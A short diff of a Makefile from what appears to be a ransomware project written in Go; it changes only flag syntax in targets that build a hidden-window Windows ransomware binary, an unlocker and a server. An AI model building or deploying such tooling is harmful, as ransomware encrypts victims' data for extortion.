@@ -15,7 +15,7 @@ pre-build:
 	mkdir -p bin
 
 ransomware:
-	cd build/ransomware && env GOOS=windows go build -ldflags="-H windowsgui" && mv ransomware.exe ../../bin
+	cd build/ransomware && env GOOS=windows go build -ldflags "-H windowsgui" && mv ransomware.exe ../../bin
 	cd build && env GOOS=windows go build unlocker.go && mv unlocker.exe ../bin
 	cd server && go build && mv `ls|grep server` ../bin
 
